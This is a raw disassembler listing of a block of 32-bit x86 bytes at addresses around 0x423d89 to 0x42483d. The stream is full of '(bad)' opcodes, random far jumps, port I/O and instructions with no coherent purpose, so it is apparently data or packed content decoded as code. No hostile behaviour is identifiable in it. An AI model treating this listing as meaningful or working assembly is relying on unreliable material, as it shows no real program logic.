  423d89:	call   DWORD PTR [ebp-0x1c35dcc5]
  423d8f:	sahf   
  423d90:	lods   eax,DWORD PTR ds:[si]
  423d92:	fxch   st(4)
  423d94:	xchg   ebx,eax
  423d95:	cmp    al,0xce
  423d97:	add    BYTE PTR [ebx+0x186ab243],ch
  423d9d:	mov    ds:0x43b7664c,al
  423da2:	fld    DWORD PTR [ebx+0x2d339ab6]
  423da8:	xor    eax,0x2b9089d
  423dad:	adc    dh,bl
  423daf:	or     al,BYTE PTR [ecx-0x58]
  423db2:	jns    0x423e2a
  423db4:	cmp    eax,0xae7c1a6e
  423db9:	jne    0x423d9b
  423dbb:	jne    0x423de6
  423dbd:	loopne 0x423df2
  423dbf:	xchg   ebp,eax
  423dc0:	jnp    0x423d9b
	...
  423e32:	add    BYTE PTR [eax],al
  423e34:	adc    DWORD PTR [ebp-0x78],0x19
  423e38:	(bad)  
  423e3a:	xchg   ebx,eax
  423e3b:	ffreep st(6)
  423e3d:	dec    eax
  423e3e:	imul   ebp,edi,0x2
  423e41:	fadd   st,st(1)
  423e43:	test   eax,0x17f4c
  423e48:	test   BYTE PTR [eax],0x0
  423e4b:	add    BYTE PTR [ebp-0x28],dl
  423e4e:	jp     0x423dd6
  423e50:	jo     0x423e2d
  423e52:	stos   DWORD PTR es:[edi],eax
  423e53:	fidivr DWORD PTR [ebx+0x5]
  423e56:	and    cl,BYTE PTR [eax+0x59]
  423e59:	outs   dx,DWORD PTR ds:[esi]
  423e5a:	push   cs
  423e5b:	mov    ds:0x51aace3a,eax
  423e60:	inc    ecx
  423e61:	ror    BYTE PTR [esi],1
  423e63:	shl    BYTE PTR ds:0x6d5ca23a,1
  423e69:	aam    0xae
  423e6b:	jmp    0xd1c5447f
  423e70:	into   
  423e71:	fwait
  423e72:	add    bl,ch
  423e74:	popf   
  423e75:	jb     0x423e05
  423e77:	jbe    0x423e9f
  423e79:	and    edx,DWORD PTR [ecx+0x5a]
  423e7c:	inc    ecx
  423e7d:	ret    0x12ad
  423e80:	es mov bl,BYTE PTR ds:[ecx+0x252a73cb]
  423e88:	inc    ebx
  423e89:	jmp    0x631:0x5fafaf9
  423e90:	mov    BYTE PTR [ebx+edi*1],ah
  423e93:	xchg   BYTE PTR [ebx+0x62ed2c3a],dh
  423e99:	nop
  423e9a:	les    edx,FWORD PTR [esi]
  423e9c:	scas   eax,DWORD PTR es:[edi]
  423e9d:	ins    DWORD PTR es:[edi],dx
  423e9e:	sbb    cl,bh
  423ea0:	mov    dl,0xf7
  423ea2:	cmp    eax,0xd2e90e1b
  423ea7:	das    
  423ea8:	dec    esi
  423ea9:	add    DWORD PTR [ebx],ecx
  423eab:	pop    esi
  423eac:	loop   0x423e74
  423eae:	pop    ebp
  423eaf:	sub    BYTE PTR [edi+0x9],0x93
  423eb3:	(bad)  
  423eb4:	or     eax,ecx
  423eb6:	bound  esi,QWORD PTR [edx-0x57]
  423eb9:	ret    0xb170
  423ebc:	mov    WORD PTR [esi],es
  423ebe:	jmp    0x423e95
  423ec0:	fwait
  423ec1:	out    0x99,al
  423ec3:	add    DWORD PTR [edx+0x27945c14],edx
  423ec9:	dec    eax
  423eca:	shl    BYTE PTR [ecx],1
  423ecc:	out    0xcc,eax
  423ece:	shr    BYTE PTR ds:0x65133e32,1
  423ed4:	push   0xc98f6af7
  423ed9:	fwait
  423eda:	sbb    esi,DWORD PTR [ebp-0x6e664457]
  423ee0:	daa    
  423ee1:	fiadd  DWORD PTR [esi-0x15]
  423ee4:	push   0x66902bb0
  423ee9:	repnz mov dh,0x70
  423eec:	clc    
  423eed:	das    
  423eee:	and    ecx,DWORD PTR [ebx+0x14]
  423ef1:	into   
  423ef2:	xchg   esi,eax
  423ef3:	pop    ecx
  423ef4:	pop    edi
  423ef5:	mov    edi,0x6bba4180
  423efa:	adc    edx,edi
  423efc:	gs jo  0x423f06
  423eff:	inc    ecx
  423f00:	bound  esp,QWORD PTR es:[ebp+0x7f]
  423f04:	mov    ds:0x5d6e949,al
  423f09:	outs   dx,BYTE PTR ds:[esi]
  423f0a:	iret   
  423f0b:	aaa    
  423f0c:	out    0x34,eax
  423f0e:	mov    DWORD PTR [ecx-0x2212991d],eax
  423f14:	jecxz  0x423f06
  423f16:	push   esp
  423f17:	mov    ah,0x47
  423f19:	std    
  423f1a:	repz gs xchg ebp,eax
  423f1d:	mov    DWORD PTR ds:0xa6fa2c16,0x832ff73a
  423f27:	sub    ch,dh
  423f29:	or     eax,0xc0bc4b06
  423f2e:	call   DWORD PTR [ebx]
  423f30:	nop
  423f31:	fwait
  423f32:	and    DWORD PTR [ebp-0x64],edi
  423f35:	xor    DWORD PTR [eax],eax
  423f37:	call   0xb70c824d
  423f3c:	cdq    
  423f3d:	inc    ecx
  423f3e:	test   DWORD PTR [ebp+0x15],edx
  423f41:	add    BYTE PTR ss:[eax],al
	...
  423fb4:	inc    esi
  423fb5:	in     al,0x62
  423fb7:	mov    dl,ah
  423fb9:	mov    gs,esi
  423fbb:	out    dx,al
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx-0x44],dh
  423fc1:	in     eax,0xcf
  423fc3:	lods   al,BYTE PTR ds:[esi]
  423fc4:	inc    edx
  423fc5:	add    BYTE PTR [ecx],0x0
  423fc8:	test   BYTE PTR [eax],0x0
  423fcb:	add    ah,bl
  423fcd:	push   edi
  423fce:	xor    BYTE PTR [esi-0x6b7ba3e1],ch
  423fd4:	pop    edx
  423fd5:	outs   dx,BYTE PTR ds:[esi]
  423fd6:	ins    BYTE PTR es:[edi],dx
  423fd7:	retf   0xe120
  423fda:	push   edx
  423fdb:	outs   dx,DWORD PTR ds:[esi]
  423fdc:	js     0x423fee
  423fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fdf:	mov    ch,0xca
  423fe1:	cmp    bh,al
  423fe3:	and    ah,dl
  423fe5:	mov    ds:0x185c0075,al
  423fea:	sub    al,0xe3
  423fec:	int    0x8d
  423fee:	rol    DWORD PTR [ebx],0x2
  423ff1:	call   0x3f60:0x960ad458
  423ff8:	dec    esp
  423ff9:	pop    ss
  423ffa:	aaa    
  423ffb:	imul   ebx,DWORD PTR [esi+0x6cc62b85],0x1d1ddf08
  424005:	mov    al,ds:0xdcfcab32
  42400a:	jo     0x424079
  42400c:	test   eax,0xf4424308
  424011:	ss std 
  424013:	shl    DWORD PTR [eax+0x17224c05],0x22
  42401a:	scas   eax,DWORD PTR es:[edi]
  42401b:	jns    0x423faf
  42401d:	add    BYTE PTR [esi-0x7800e001],0xf0
  424024:	xchg   edi,eax
  424025:	jecxz  0x42400f
  424027:	inc    ebp
  424028:	jbe    0x424088
  42402a:	call   0xecca10ec
  42402f:	iret   
  424030:	push   eax
  424031:	out    0x60,eax
  424033:	mov    ch,bh
  424035:	repz hlt 
  424037:	stos   BYTE PTR es:[edi],al
  424038:	sub    eax,0xc26846f9
  42403d:	jbe    0x423fe9
  42403f:	xchg   DWORD PTR [ecx-0x49],ebp
  424042:	cmp    edi,edi
  424044:	or     eax,0x28d49219
  424049:	pop    edx
  42404a:	stc    
  42404b:	mov    eax,0x3462a115
  424050:	sub    DWORD PTR [edi+0x20],ecx
  424053:	js     0x42408d
  424055:	jecxz  0x423fe3
  424057:	xor    ebp,DWORD PTR [ebx+ebx*2+0x52504878]
  42405e:	push   eax
  42405f:	pop    ebx
  424060:	repz inc edx
  424062:	cmp    DWORD PTR [esi],0x7f
  424065:	or     bl,BYTE PTR [ebp-0x8161448]
  42406b:	shl    BYTE PTR [edx+0x5dee53d9],1
  424071:	xlat   BYTE PTR ds:[ebx]
  424072:	dec    ecx
  424073:	mov    WORD PTR [ebx+0x30],?
  424076:	inc    esi
  424077:	cmc    
  424078:	or     bl,dl
  42407a:	aas    
  42407b:	aaa    
  42407c:	das    
  42407d:	fld    st(3)
  42407f:	jb     0x4240b8
  424081:	xchg   esp,eax
  424082:	pusha  
  424083:	lahf   
  424084:	jno    0x424030
  424086:	dec    esp
  424087:	add    BYTE PTR [edx+ebp*2-0x6],cl
  42408b:	pusha  
  42408c:	cmp    cl,BYTE PTR [ebp+0x6d]
  42408f:	aas    
  424090:	fmul   QWORD PTR [edi-0x50]
  424093:	inc    ecx
  424094:	ja     0x424041
  424096:	dec    ebx
  424097:	sub    DWORD PTR [edi-0x1d],0x65
  42409b:	cmp    BYTE PTR [ebp-0x13],dl
  42409e:	shl    bh,cl
  4240a0:	fist   WORD PTR [ebx+esi*1]
  4240a3:	fmul   DWORD PTR [edx+ebx*1-0x4f753899]
  4240aa:	xchg   esi,eax
  4240ab:	mov    ds:0x48bed231,eax
  4240b0:	cmp    BYTE PTR [edi],dh
  4240b2:	cwde   
  4240b3:	sar    DWORD PTR [edi+0x5f8c71cc],cl
  4240b9:	cmp    ebp,DWORD PTR [edx+0x52]
  4240bc:	jne    0x4240dd
  4240be:	mov    edi,0x8d2f39
	...
  424133:	add    BYTE PTR [ecx-0xf],bh
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x6b538496]
  424142:	daa    
  424143:	xchg   ebp,eax
  424144:	cmp    BYTE PTR [ecx+0xf60001],al
  42414a:	add    BYTE PTR [eax],al
  42414c:	ss push ss
  42414e:	mov    dl,0x67
  424150:	mov    al,0x42
  424152:	cwde   
  424153:	ins    BYTE PTR es:[edi],dx
  424154:	sbb    DWORD PTR [ecx+0x70],0xe2402b08
  42415b:	cs pop edi
  42415d:	adc    cl,BYTE PTR [esi]
  42415f:	jbe    0x424155
  424161:	jmp    0x1c3:0x7842989e
  424168:	xor    dl,ch
  42416a:	jge    0x424133
  42416c:	jecxz  0x424194
  42416e:	stos   BYTE PTR es:[edi],al
  42416f:	mov    BYTE PTR [eax-0x1e],cl
  424172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424173:	adc    al,BYTE PTR [edi+0x2e]
  424176:	leave  
  424177:	mov    eax,0xae377e12
  42417c:	mov    bh,BYTE PTR [ecx-0x309c282d]
  424182:	mov    eax,ds:0xa5a18e67
  424187:	das    
  424188:	aas    
  424189:	mov    esp,0xeb54fe33
  42418e:	xlat   BYTE PTR ds:[ebx]
  42418f:	cmovnp edi,DWORD PTR [edi-0x52]
  424193:	mov    ds:0x459f4e8e,eax
  424198:	out    0x94,al
  42419a:	pop    ebp
  42419b:	pop    ecx
  42419c:	clc    
  42419d:	pop    es
  42419e:	jns    0x424210
  4241a0:	gs jae 0x4241f9
  4241a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241a4:	fstp   QWORD PTR [edi-0x73]
  4241a7:	inc    ebx
  4241a8:	sbb    DWORD PTR [eax],esi
  4241aa:	fiadd  DWORD PTR [edi-0x7bb9c52c]
  4241b0:	pop    ss
  4241b1:	inc    edi
  4241b2:	gs nop
  4241b4:	dec    edi
  4241b5:	inc    ebx
  4241b6:	stos   BYTE PTR es:[edi],al
  4241b7:	sub    BYTE PTR [esi],ch
  4241b9:	aad    0x3c
  4241bb:	scas   al,BYTE PTR es:[edi]
  4241bc:	idiv   BYTE PTR [edi]
  4241be:	push   esi
  4241bf:	dec    ebx
  4241c0:	xor    DWORD PTR [eax],ecx
  4241c2:	or     al,0x18
  4241c4:	and    eax,0x3883dc8f
  4241ca:	pop    edx
  4241cb:	mov    esp,0x593e849b
  4241d0:	dec    bx
  4241d2:	jne    0x42421b
  4241d4:	pushf  
  4241d5:	push   ds
  4241d6:	outs   dx,BYTE PTR ds:[esi]
  4241d7:	mov    esi,0xbfb296b8
  4241dc:	dec    edi
  4241dd:	fldenv [esi+0x19]
  4241e0:	ja     0x42417f
  4241e2:	inc    ebp
  4241e3:	fucomp st(3)
  4241e5:	shl    DWORD PTR [edi-0x27],1
  4241e8:	stos   DWORD PTR es:[edi],eax
  4241e9:	adc    BYTE PTR [ebx+0x71e59c6],bl
  4241ef:	pop    esp
  4241f0:	fidivr WORD PTR [eax+0x3c]
  4241f3:	sbb    eax,0x21728660
  4241f8:	outs   dx,BYTE PTR ds:[esi]
  4241f9:	test   DWORD PTR [edx],ebp
  4241fb:	or     al,0x37
  4241fd:	add    ch,BYTE PTR ds:0x43b7ba2b
  424203:	ss loope 0x4241e0
  424206:	shr    BYTE PTR [eax-0x33],1
  424209:	outs   dx,DWORD PTR ds:[esi]
  42420a:	adc    bl,BYTE PTR ds:0xc250960b
  424210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424211:	pop    esi
  424212:	inc    edx
  424213:	pop    ebx
  424214:	out    0x26,al
  424216:	into   
  424217:	stc    
  424218:	add    al,0x9c
  42421a:	sbb    al,BYTE PTR [eax]
  42421c:	dec    eax
  42421d:	mov    ah,BYTE PTR [ecx-0x3c5a3cf5]
  424223:	in     al,0xcd
  424225:	in     eax,dx
  424226:	outs   dx,BYTE PTR ds:[esi]
  424227:	lods   eax,DWORD PTR ds:[esi]
  424228:	ficom  DWORD PTR [edx-0x57666db2]
  42422e:	jnp    0x424254
  424230:	(bad)  
  424231:	push   eax
  424232:	lahf   
  424233:	push   0x791f7124
  424238:	jp     0x42426c
  42423a:	fbld   TBYTE PTR [edi-0x9dab02d]
  424240:	xchg   ebx,eax
  424241:	lock add BYTE PTR [eax],al
	...
  4242b4:	clc    
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x1304a4bf,eax
  4242c2:	adc    al,0x69
  4242c4:	add    BYTE PTR cs:[ecx],0x0
  4242c8:	test   BYTE PTR [eax],0x0
  4242cb:	add    BYTE PTR [eax+0x2e],cl
  4242ce:	les    ebp,FWORD PTR [ebx+0x57]
  4242d1:	inc    esi
  4242d2:	inc    ebp
  4242d3:	loopne 0x4242a3
  4242d5:	cmp    BYTE PTR [ebp+esi*1-0x7f],bh
  4242d9:	mul    BYTE PTR [ebx-0x12]
  4242dc:	bound  ebx,QWORD PTR [ecx]
  4242de:	ins    BYTE PTR es:[edi],dx
  4242df:	cmp    eax,0xcbc4e10a
  4242e4:	cli    
  4242e5:	repz pushf 
  4242e7:	call   0x63b2897e
  4242ec:	cmp    DWORD PTR [edi-0x14],ecx
  4242ef:	fnstenv [ecx-0x17]
  4242f2:	es sub eax,0x140b14d4
  4242f8:	in     al,0x39
  4242fa:	(bad)  
  4242fb:	cli    
  4242fc:	repnz daa 
  4242fe:	in     eax,dx
  4242ff:	retf   
  424300:	(bad)  
  424301:	pop    ebp
  424302:	cdq    
  424303:	hlt    
  424304:	and    ecx,ecx
  424306:	mov    ebp,0x987de4ef
  42430b:	push   esi
  42430c:	mov    bl,BYTE PTR [ecx]
  42430e:	xor    ah,cl
  424310:	push   cs
  424311:	sbb    eax,0x4308a6a7
  424316:	mov    WORD PTR [esi-0x21],ds
  424319:	or     bl,BYTE PTR [edi+0x8]
  42431c:	adc    eax,0x49b12df8
  424321:	dec    esi
  424322:	(bad)  
  424323:	xchg   BYTE PTR [esi-0x1e],ch
  424326:	adc    ecx,eax
  424328:	add    DWORD PTR [ecx-0x38],edx
  42432b:	sar    DWORD PTR [ebx+0x61],0x56
  42432f:	dec    esp
  424331:	(bad)  
  424332:	pop    ds
  424333:	popf   
  424334:	pop    ebp
  424335:	cmc    
  424336:	ficomp DWORD PTR [eax+0x60efbc8d]
  42433c:	outs   dx,DWORD PTR ds:[esi]
  42433d:	mov    ?,WORD PTR [esi-0x3d]
  424340:	call   0xc9bf:0xa71e9ec3
  424347:	push   edx
  424348:	or     esi,DWORD PTR [ecx-0x7b]
  42434b:	push   eax
  42434c:	rcr    esp,1
  42434e:	mov    bh,BYTE PTR [ebp+0x25c7eff3]
  424354:	in     al,0x6b
  424356:	cmp    bl,ah
  424358:	sahf   
  424359:	push   ss
  42435a:	cmp    BYTE PTR [esi],dh
  42435c:	pxor   mm2,QWORD PTR [esi+0x6f]
  424360:	adc    dh,cl
  424362:	push   esp
  424363:	lds    ebp,FWORD PTR [ebx]
  424365:	pop    ebx
  424366:	push   cs
  424367:	mov    bl,0xa9
  424369:	sub    ecx,ebx
  42436b:	sbb    BYTE PTR [esi+0x76],al
  42436e:	xor    eax,0x9c3276e2
  424373:	imul   ecx,DWORD PTR [esi-0x1b],0xfffffff3
  424377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424378:	jge    0x424354
  42437a:	mov    dl,0xdf
  42437c:	add    al,0xf4
  42437e:	add    eax,0x1bcbe232
  424383:	outs   dx,DWORD PTR ds:[esi]
  424384:	popa   
  424385:	in     al,0x9e
  424387:	pop    ebp
  424388:	xchg   esp,eax
  424389:	mov    ds:0x7e7cc999,eax
  42438e:	pop    es
  42438f:	add    ah,ah
  424391:	cmp    ebp,DWORD PTR ds:0xd1765f80
  424397:	xchg   edx,eax
  424398:	(bad)  
  424399:	in     eax,dx
  42439a:	jmp    0xa676:0xa810dfaf
  4243a1:	jno    0x4243e0
  4243a3:	push   ecx
  4243a4:	in     al,0x5
  4243a6:	and    al,0x12
  4243a8:	getsec 
  4243aa:	jp     0x4243be
  4243ac:	mov    cl,0xda
  4243ae:	js     0x42436a
  4243b0:	(bad)  
  4243b1:	out    dx,al
  4243b2:	shl    dl,cl
  4243b4:	ret    
  4243b5:	mov    bh,0x85
  4243b7:	or     ebx,DWORD PTR [ebx+ebx*2+0x66]
  4243bb:	ret    
  4243bc:	dec    eax
  4243bd:	test   al,0xc4
  4243bf:	sub    BYTE PTR [ecx],0x92
	...
  424432:	add    BYTE PTR [eax],al
  424434:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42443b:	mov    edi,0xd28abb70
  424440:	test   ah,dh
  424442:	pop    ss
  424443:	pop    ebp
  424444:	and    al,0x83
  424446:	add    DWORD PTR [eax],eax
  424448:	test   BYTE PTR [eax],0x0
  42444b:	add    bl,bl
  42444d:	xor    cl,BYTE PTR [eax]
  42444f:	icebp  
  424450:	leave  
  424451:	ret    
  424452:	xchg   ebx,eax
  424453:	call   ebx
  424455:	cmp    ch,BYTE PTR [ebx]
  424457:	inc    esi
  424458:	and    dl,BYTE PTR [edi]
  42445a:	ficomp WORD PTR [eax-0x72]
  42445d:	dec    edx
  42445e:	mov    ah,0x30
  424460:	out    dx,al
  424461:	cdq    
  424462:	in     eax,0xec
  424464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424465:	xchg   DWORD PTR ds:0xd3909ad5,esi
  42446b:	ins    BYTE PTR es:[edi],dx
  42446c:	dec    ebx
  42446d:	dec    esp
  42446e:	mov    eax,DWORD PTR [ebx-0x377da34b]
  424474:	mov    eax,ds:0xdb134d45
  424479:	in     eax,0x99
  42447b:	adc    edx,DWORD PTR [esp+eiz*4+0x45]
  42447f:	ret    0x8830
  424482:	cmp    eax,0x4a05406f
  424487:	mov    eax,0x8dc9ab7c
  42448c:	mov    DWORD PTR [edi],esp
  42448e:	(bad)  
  42448f:	loope  0x42448f
  424491:	std    
  424492:	inc    ebp
  424493:	jle    0x42444d
  424495:	xchg   ebp,eax
  424496:	neg    bl
  424498:	les    ebx,FWORD PTR [ebx]
  42449a:	pop    ds
  42449b:	mov    eax,DWORD PTR [ebx+esi*8]
  42449e:	inc    esp
  42449f:	movntq (bad),mm7
  4244a0:	out    0xfe,eax
  4244a2:	in     eax,dx
  4244a3:	add    dl,BYTE PTR ds:0xccdba1b7
  4244a9:	(bad)  
  4244aa:	test   DWORD PTR [bp+si+0xa7f],eax
  4244af:	lods   al,BYTE PTR ds:[esi]
  4244b0:	sub    cl,BYTE PTR [ebx+esi*4]
  4244b3:	(bad)  
  4244b4:	or     DWORD PTR [ecx+0x18],ecx
  4244b7:	inc    ebp
  4244b8:	pop    ebp
  4244b9:	sbb    edx,DWORD PTR [eax]
  4244bb:	test   ecx,edi
  4244bd:	rol    BYTE PTR [esi-0x5a4fb28b],1
  4244c3:	rol    edx,cl
  4244c5:	push   ds
  4244c6:	xchg   ebx,eax
  4244c7:	jns    0x424525
  4244c9:	out    dx,al
  4244ca:	jmp    0x30bc:0xd176c0a5
  4244d1:	xor    DWORD PTR [eax+0x63563eb2],0x5d
  4244d8:	xor    al,0xd5
  4244da:	retf   
  4244db:	cmp    DWORD PTR [edi-0x2f],esi
  4244de:	xor    DWORD PTR [edi-0x22],ebp
  4244e1:	ins    BYTE PTR es:[edi],dx
  4244e2:	lahf   
  4244e3:	div    DWORD PTR [edi]
  4244e5:	stc    
  4244e6:	mov    BYTE PTR [edi+0x2],dl
  4244e9:	ret    
  4244ea:	fcmovb st,st(1)
  4244ec:	fdiv   st,st(3)
  4244ee:	xor    DWORD PTR [ecx+0x6c8fa64c],ebx
  4244f4:	les    eax,FWORD PTR gs:[edi-0x4409e007]
  4244fb:	xchg   edi,eax
  4244fc:	jmp    0x8fc2421e
  424501:	jno    0x4244d8
  424503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424504:	test   DWORD PTR [ebx+ebp*4-0x3a35d86b],edx
  42450b:	dec    ebx
  42450c:	ror    BYTE PTR [edx],cl
  42450e:	mov    ebp,0x456fe77d
  424513:	and    DWORD PTR [eax-0x7a],eax
  424516:	jge    0x4244f6
  424518:	sbb    edi,eax
  42451a:	xchg   esp,eax
  42451b:	cmp    bh,BYTE PTR [ebx+0x63]
  42451e:	push   esp
  42451f:	cmp    al,0x43
  424521:	pop    ds
  424522:	jecxz  0x424522
  424524:	les    ebx,FWORD PTR [edx]
  424526:	pop    ss
  424527:	dec    ebx
  424528:	icebp  
  424529:	leave  
  42452a:	push   0xffffffac
  42452c:	nop
  42452d:	ror    BYTE PTR [ebp+0x14],0x19
  424531:	test   al,0x27
  424533:	mov    bh,0x1c
  424535:	mov    edi,DWORD PTR [ebx+0x18]
  424538:	pop    DWORD PTR [ebx]
  42453a:	in     eax,dx
  42453b:	inc    ecx
  42453c:	nop
  42453d:	jne    0x4244e9
  42453f:	mov    al,0xb5
  424541:	adc    al,BYTE PTR [eax]
	...
  4245b3:	add    BYTE PTR [eax+0x7f747c8f],al
  4245b9:	test   DWORD PTR [eax+0x6c527eff],0xeb92ab31
  4245c3:	push   edi
  4245c4:	sbb    al,BYTE PTR [ecx+eax*1+0xf600]
  4245cb:	add    BYTE PTR [eax+0x77],bl
  4245ce:	add    esi,DWORD PTR [ebp+0x787aef3f]
  4245d4:	push   ss
  4245d5:	lods   eax,DWORD PTR ds:[esi]
  4245d6:	out    dx,eax
  4245d7:	xor    ch,BYTE PTR [ebx]
  4245d9:	outs   dx,DWORD PTR ds:[esi]
  4245da:	mov    bl,0xfe
  4245dc:	(bad)  
  4245dd:	(bad)  
  4245df:	xchg   ebp,eax
  4245e0:	xchg   edi,eax
  4245e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245e2:	popf   
  4245e3:	jmp    0xf2a6:0x295b1da1
  4245ea:	xor    ch,0x99
  4245ed:	mov    BYTE PTR [edi+0x59db165f],al
  4245f3:	lods   eax,DWORD PTR ds:[esi]
  4245f4:	xchg   ebx,eax
  4245f5:	in     eax,dx
  4245f6:	and    DWORD PTR [ebx],0xc0956b85
  4245fc:	sbb    ebx,DWORD PTR [ebx+eiz*1+0x13]
  424600:	je     0x4245cc
  424602:	out    0xe9,eax
  424604:	cmp    al,0x68
  424606:	cdq    
  424607:	cld    
  424608:	add    al,0xe4
  42460a:	loopne 0x424676
  42460c:	clc    
  42460d:	push   ds
  42460e:	pop    edx
  42460f:	sub    BYTE PTR [edi],bl
  424611:	mov    ebx,0xf6eed600
  424616:	and    DWORD PTR [edx+0x3c],esp
  424619:	push   ecx
  42461a:	adc    BYTE PTR [edx],0xaf
  42461d:	cmp    edx,DWORD PTR [eax+ebx*4-0x15e58817]
  424624:	jmp    0x162b4191
  424629:	shl    BYTE PTR [ebp-0x548b2e51],1
  42462f:	test   BYTE PTR ds:0x284cb05f,bl
  424635:	sahf   
  424636:	out    0x24,eax
  424638:	and    bh,cl
  42463a:	mov    al,ds:0x4f7e8679
  42463f:	pop    ebx
  424640:	imul   esp,esi,0x56abc770
  424646:	cmc    
  424647:	pop    ecx
  424648:	mov    ch,0x1f
  42464a:	ret    
  42464b:	dec    esi
  42464c:	jno    0x4245fa
  42464e:	adc    BYTE PTR [ebp-0x34],al
  424651:	dec    esi
  424652:	push   es
  424653:	inc    ecx
  424654:	push   es
  424655:	adc    al,0x33
  424657:	fdivr  QWORD PTR [ebp+0x2c]
  42465a:	test   BYTE PTR [esi],0xfd
  42465d:	jnp    0x4246bd
  42465f:	xchg   ecx,eax
  424660:	mov    edx,0x2dab2c06
  424665:	popa   
  424666:	dec    esi
  424667:	out    dx,eax
  424668:	cld    
  424669:	xchg   edx,eax
  42466a:	pop    ebx
  42466b:	fbld   TBYTE PTR [ebx+0x5d]
  42466e:	cmp    eax,0x332d4896
  424673:	pushf  
  424674:	lahf   
  424675:	sbb    bl,bh
  424677:	js     0x424697
  424679:	xor    BYTE PTR [ebp+ebp*1+0x11c7524e],dh
  424680:	and    ebx,edi
  424682:	push   edi
  424683:	outs   dx,DWORD PTR ds:[esi]
  424684:	inc    ebp
  424685:	mov    ebp,0xb293081f
  42468a:	in     al,0x8b
  42468c:	lock adc eax,0x24563bc7
  424692:	mov    ecx,0x8ac5eda5
  424697:	push   edi
  424698:	sbb    DWORD PTR [edi-0x335ba772],ecx
  42469e:	and    DWORD PTR [ebx+0x14b1a9c0],0x1a
  4246a5:	xchg   esi,eax
  4246a6:	repz pusha 
  4246a8:	lahf   
  4246a9:	push   ebx
  4246aa:	mov    al,0x78
  4246ac:	pushf  
  4246ad:	inc    edx
  4246ae:	mov    dl,0x54
  4246b0:	loope  0x42464b
  4246b2:	mov    ebp,0x59e3657d
  4246b7:	cmp    BYTE PTR [edx-0x361f3ef],cl
  4246bd:	cli    
  4246be:	out    dx,eax
  4246bf:	sbb    DWORD PTR [ecx],ebx
  4246c1:	add    al,0x0
	...
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fisttp QWORD PTR [eax]
  424741:	into   
  424742:	out    dx,eax
  424743:	adc    BYTE PTR fs:[ebp+0xf60001],al
  42474a:	add    BYTE PTR [eax],al
  42474c:	mov    ecx,0x54f69af2
  424751:	mov    ecx,0xfb8a57d0
  424756:	sub    eax,DWORD PTR [edx-0x753449a2]
  42475c:	jo     0x4247bf
  42475e:	jge    0x424730
  424760:	sbb    ah,0x21
  424763:	ins    DWORD PTR es:[edi],dx
  424764:	in     al,0x72
  424766:	dec    ecx
  424767:	mov    edx,0xee276f55
  42476c:	mov    ds:0x5a8cc2d5,al
  424771:	test   edx,eax
  424773:	mov    ebx,DWORD PTR [ebp-0x2654e655]
  424779:	dec    edx
  42477a:	loope  0x4247f3
  42477c:	popa   
  42477d:	lea    esi,ds:0xb7948a2d
  424783:	dec    eax
  424784:	daa    
  424785:	or     al,0x5f
  424787:	and    BYTE PTR [esi],dh
  424789:	push   ebx
  42478a:	leave  
  42478b:	sahf   
  42478c:	fs in  al,0xb7
  42478f:	lahf   
  424790:	xor    eax,0x89714a7
  424795:	hlt    
  424796:	mov    edi,DWORD PTR [edi-0x66]
  424799:	adc    eax,0xd3df8705
  42479e:	mov    eax,0x793cffab
  4247a3:	(bad)  
  4247a4:	pop    ecx
  4247a5:	xchg   bl,bh
  4247a7:	hlt    
  4247a8:	inc    edi
  4247a9:	in     eax,dx
  4247aa:	pop    edi
  4247ab:	or     al,0xa0
  4247ad:	aad    0xbd
  4247af:	outs   dx,BYTE PTR ds:[esi]
  4247b0:	cs mov edx,0xa8f1b719
  4247b6:	cli    
  4247b7:	int    0xf6
  4247b9:	jl     0x42480b
  4247bb:	jb     0x42478c
  4247bd:	add    edi,ecx
  4247bf:	inc    ecx
  4247c0:	(bad)  
  4247c1:	retf   
  4247c2:	sub    ax,WORD PTR [edi+0x55d68b53]
  4247c9:	out    0x21,eax
  4247cb:	push   eax
  4247cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247cd:	xor    eax,0x54ff064d
  4247d2:	pop    ebp
  4247d3:	je     0x424809
  4247d5:	sbb    cl,al
  4247d7:	pushf  
  4247d8:	fs xchg edx,eax
  4247da:	mov    bl,BYTE PTR [edi]
  4247dc:	inc    ebp
  4247dd:	dec    edi
  4247de:	mov    ds:0x1ed9898b,eax
  4247e3:	dec    ebp
  4247e4:	mov    ebx,0xddb852c9
  4247ea:	xor    DWORD PTR [eax+0x9363ac7],edx
  4247f0:	sbb    al,0x36
  4247f2:	mov    edx,edi
  4247f4:	sub    ebp,DWORD PTR [ebx]
  4247f6:	sbb    eax,0x87502600
  4247fb:	sub    cl,BYTE PTR [ebx]
  4247fd:	cmp    cl,BYTE PTR [ecx+0x3e]
  424800:	sub    esp,DWORD PTR [ebp-0x29]
  424803:	inc    ebx
  424804:	mov    DWORD PTR ds:0x8372d65e,ebp
  42480a:	push   0xffffffd9
  42480c:	sub    DWORD PTR [esi-0x44],esi
  42480f:	sub    DWORD PTR [eax+0x2e8ee408],ebp
  424815:	dec    esp
  424816:	xor    DWORD PTR [eax],edi
  424818:	jmp    0x7392:0x31f406e9
  42481f:	clc    
  424820:	adc    BYTE PTR [ebp+0xa73d686],dl
  424826:	(bad)  
  424828:	dec    edi
  424829:	jp     0x42488b
  42482b:	stc    
  42482c:	mov    esp,0x2f8b6391
  424831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424832:	mov    ds:0xbaa4be61,eax
  424837:	and    eax,0x9a8ed877
  42483c:	inc    ecx
  42483d:	leave  
